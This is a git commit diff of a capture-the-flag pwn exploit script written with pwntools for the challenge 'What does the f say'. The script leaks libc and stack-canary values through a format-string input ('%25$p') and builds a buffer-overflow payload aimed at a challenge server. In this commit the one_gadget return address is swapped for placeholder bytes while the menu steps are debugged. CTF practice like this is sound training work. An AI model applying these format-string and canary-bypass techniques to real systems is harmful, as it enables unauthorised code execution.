db5ca5fe9c751b3df1082d9e77bb924f74dfe5cf
ShundaZhang <zhangshunda@gmail.com>
2023-05-02 18:43:59 +0800

    Solving What does the f say.

--- ctf/pwn/Whatdoesthefsay/dec.py
+++ ctf/pwn/Whatdoesthefsay/dec.py
@@ -17,6 +17,7 @@ def detect(io):
 
 ip, port = '165.227.225.180',31422
 io = remote(ip, port)
+
 #io = process('./what_does_the_f_say')
 #io = gdb.debug('./what_does_the_f_say', 'break main')
 
@@ -44,7 +45,7 @@ io.recvuntil('Red or Green Kryptonite?')
 io.sendline('%25$p'.encode())
 io.recvline()
 libc_start_main = int(io.recvline().decode().strip(),16)
-#print(hex(libc_start_main))a
+#print(hex(libc_start_main))
 
 #https://libc.blukat.me/?q=__libc_start_main_ret%3A0x7f7e8581ab97&l=libc6_2.27-3ubuntu1.2_amd64
 
@@ -70,15 +71,22 @@ offset = 24
 payload = offset*b'A'
 payload += p64(canary)
 payload += 8*b'A'
-payload += p64(one_gadget)
+#payload += p64(one_gadget)
+payload += 8*b'B'
 
-for i in range(7):
+#1 -> 1 works, but 1 -> 2 -> 1 doesn't work?? the canary offsets more 32 bytes...
+for i in range(9):
 	io.recvuntil('2. Space food')
 	io.sendline(b'1')
 	io.recvuntil('3. Deathstar(70.00 s.rocks)')
-	io.sendline(b'2')
-	io.recvuntil('Red or Green Kryptonite?')
 	io.sendline(b'1')
+
+io.recvuntil('2. Space food')
+io.sendline(b'1')
+io.recvuntil('3. Deathstar(70.00 s.rocks)')
+io.sendline(b'2')
+io.recvuntil('Red or Green Kryptonite?')
+io.sendline(b'2')
 io.recvuntil('You have less than 20 space rocks! Are you sure you want to buy it?')
 io.sendline(payload)
 io.interactive()
